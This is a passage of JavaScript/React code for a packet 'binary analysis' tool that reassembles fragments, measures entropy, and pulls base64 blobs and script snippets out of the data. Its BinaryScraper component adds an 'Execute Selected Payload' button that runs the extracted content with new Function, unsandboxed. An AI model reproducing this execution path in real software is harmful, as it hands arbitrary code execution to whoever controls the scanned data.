        for (let i = 0; i < binary.length - windowSize; i += windowSize) {
            const freqMap = new Array(256).fill(0);
            for (let j = 0; j < windowSize; j++) {
                freqMap[binary[i + j]]++;
            }
            frequencyWindows.push({
                offset: i,
                frequencies: freqMap,
                entropy: calculateWindowEntropy(freqMap, windowSize)
            });
        }

        // Find section boundaries by entropy changes
        for (let i = 1; i < frequencyWindows.length; i++) {
            const entropyDiff = Math.abs(frequencyWindows[i].entropy - frequencyWindows[i - 1].entropy);
            if (entropyDiff > 1.5) { // Threshold for significant change
                results.sections.push({
                    offset: frequencyWindows[i].offset,
                    entropyChange: entropyDiff
                });
            }
        }

        // Calculate entropy for a window
        function calculateWindowEntropy(freqMap, windowSize) {
            let entropy = 0;
            for (let i = 0; i < 256; i++) {
                if (freqMap[i] > 0) {
                    const p = freqMap[i] / windowSize;
                    entropy -= p * Math.log2(p);
                }
            }
            return entropy;
        }

        // Look for potential code or payload sections
        // High entropy regions often contain compressed or encrypted data
        const highEntropyWindows = frequencyWindows
            .filter(window => window.entropy > 7.0) // Very high entropy threshold
            .map(window => window.offset);

        if (highEntropyWindows.length > 0) {
            results.potentialPayloads.push({
                type: 'high_entropy',
                offsets: highEntropyWindows
            });
        }

        return results;
    },

    // Extract potential payloads from binary data based on patterns
    extractPayloads: (binary) => {
        const payloads = [];

        // Look for base64 patterns
        const base64Regex = /[A-Za-z0-9+/=]{20,}/g;
        const textDecoder = new TextDecoder();
        const text = textDecoder.decode(binary);
        const base64Matches = text.match(base64Regex) || [];

        base64Matches.forEach(match => {
            try {
                // Verify it's valid base64
                const decoded = atob(match);
                payloads.push({
                    type: 'base64',
                    data: match,
                    decodedPreview: decoded.substring(0, 50)
                });
            } catch (e) {
                // Not valid base64, ignore
            }
        });

        // Look for script tags or code patterns
        const scriptPatterns = [
            /<script[^>]*>([\s\S]*?)<\/script>/gi,
            /function\s*\w*\s*\([^)]*\)\s*\{[\s\S]*?\}/g,
            /class\s+\w+\s*\{[\s\S]*?\}/g
        ];

        scriptPatterns.forEach(pattern => {
            const matches = text.match(pattern) || [];
            matches.forEach(match => {
                payloads.push({
                    type: 'script',
                    data: match,
                    preview: match.substring(0, 50)
                });
            });
        });

        return payloads;
    },

    // Reassemble fragments using binary analysis
    reassembleWithBinaryAnalysis: (fragments) => {
        if (!fragments || fragments.length === 0) return null;

        // First try standard reassembly by sequence
        const sequenced = [...fragments].sort((a, b) => {
            const seqA = parseInt(a.split('|')[0]);
            const seqB = parseInt(b.split('|')[0]);
            return seqA - seqB;
        });

        const assembled = sequenced.map(f => f.split('|')[1]).join('');

        // Now perform binary analysis on the assembled data
        try {
            // Try to decode as base64
            const binary = BinaryAnalysisModule.parseBinary(assembled, 'base64');

            // Analyze the binary structure
            const analysis = BinaryAnalysisModule.analyzeBinaryStructure(binary);

            // Extract potential code fragments
            const codeFragments = BinaryAnalysisModule.extractCodeFragments(binary);

            // Extract potential payloads
            const payloads = BinaryAnalysisModule.extractPayloads(binary);

            return {
                assembled: assembled,
                binary: binary,
                analysis: analysis,
                codeFragments: codeFragments,
                payloads: payloads
            };
        } catch (e) {
            console.error("Binary analysis error:", e);
            return {
                assembled: assembled,
                error: e.message
            };
        }
    }
};

// Binary Scraper Component
function BinaryScraper() {
    const [binarySource, setBinarySource] = useState("");
    const [analysisResults, setAnalysisResults] = useState(null);
    const [selectedPayload, setSelectedPayload] = useState(null);

    const analyzeBinary = () => {
        try {
            // Parse the binary data
            const binary = BinaryAnalysisModule.parseBinary(binarySource,
                binarySource.startsWith('data:') ? 'raw' :
                    /^[A-Za-z0-9+/=]+$/.test(binarySource) ? 'base64' : 'hex');

            // Analyze structure
            const analysis = BinaryAnalysisModule.analyzeBinaryStructure(binary);

            // Extract code fragments
            const codeFragments = BinaryAnalysisModule.extractCodeFragments(binary);

            // Extract payloads
            const payloads = BinaryAnalysisModule.extractPayloads(binary);

            setAnalysisResults({
                fileType: analysis.fileType,
                sections: analysis.sections,
                codeFragments: codeFragments,
                payloads: payloads
            });
        } catch (e) {
            setAnalysisResults({ error: e.message });
        }
    };

    const executePayload = () => {
        if (!selectedPayload) return;

        try {
            if (selectedPayload.type === 'base64') {
                const decoded = atob(selectedPayload.data);
                (new Function(decoded))();
            } else if (selectedPayload.type === 'script') {
                (new Function(selectedPayload.data))();
            }

            setAnalysisResults({
                ...analysisResults,
                executionResult: "Payload executed successfully"
            });
        } catch (e) {
            setAnalysisResults({
                ...analysisResults,
                executionResult: `Execution error: ${e.message}`
            });
        }
    };

    return (
        <div className= "space-y-2 mt-4" >
        <h3 className="text-sm font-medium" > Binary Analysis & Scraping </h3>

            < textarea
    value = { binarySource }
    onChange = {(e) => setBinarySource(e.target.value)
}
placeholder = "Paste hex dump, base64 data, or raw binary data"
className = "w-full h-24 p-2 text-xs font-mono border rounded-md"
    />

    <div className="flex space-x-2" >
        <Button onClick={ analyzeBinary } variant = "outline" size = "sm" >
            Analyze Binary
                </Button>
                < Button
onClick = { executePayload }
variant = "outline"
size = "sm"
disabled = {!selectedPayload}
                >
    Execute Selected Payload
        </Button>
        </div>

{
    analysisResults && (
        <div className="mt-2 space-y-2" >
            <div className="text-xs" >
                <span className="font-medium" > File Type: </span> {analysisResults.fileType}
                    </div>

    {
        analysisResults.sections && analysisResults.sections.length > 0 && (
            <div>
            <p className="text-xs font-medium" > Sections({ analysisResults.sections.length }): </p>
                < div className = "text-xs bg-black/10 p-2 rounded-md max-h-20 overflow-y-auto" >
                {
                    analysisResults.sections.map((section, i) => (
                        <div key= { i } >
                        Offset: 0x{ section.offset.toString(16).padStart(8, '0') }
                            (Entropy Δ: { section.entropyChange.toFixed(2) })
                    </div>
                    ))
                }
                    </div>
                    </div>
                    )
    }

    {
        analysisResults.payloads && analysisResults.payloads.length > 0 && (
            <div>
            <p className="text-xs font-medium" > Potential Payloads({ analysisResults.payloads.length }): </p>
                < div className = "text-xs bg-black/10 p-2 rounded-md max-h-40 overflow-y-auto" >
                {
                    analysisResults.payloads.map((payload, i) => (
                        <div 
                                        key= { i }
                                        className = {`p-1 cursor-pointer rounded ${selectedPayload === payload ? 'bg-primary text-primary-foreground' : 'hover:bg-muted'}`}
        onClick = {() => setSelectedPayload(payload)
    }
                                    >
        <div><span className="font-medium" > Type: </span> {payload.type}</div >
            <div className="font-mono text-[10px] truncate" >
                { payload.decodedPreview || payload.preview || payload.data.substring(0, 50) }...
    </div>
        </div>
                                ))
}
</div>
    </div>
                    )}

{
    analysisResults.executionResult && (
        <div className="text-xs font-medium" >
            Execution Result: { analysisResults.executionResult }
    </div>
                    )
}

{
    analysisResults.error && (
        <div className="text-xs text-red-500" >
            Error: { analysisResults.error }
    </div>
                    )
}
</div>
            )}
</div>
    );
}

// Update the Network tab to include Binary Scraping
function NetworkTab() {
    return (
        <div className= "space-y-4" >
        <p className="text-sm" > Network packet analysis and binary reconstruction </p>
            < IPBasedReassembly />
            <PacketCaptureControls />
            < BinaryScraper />
            </div>)
}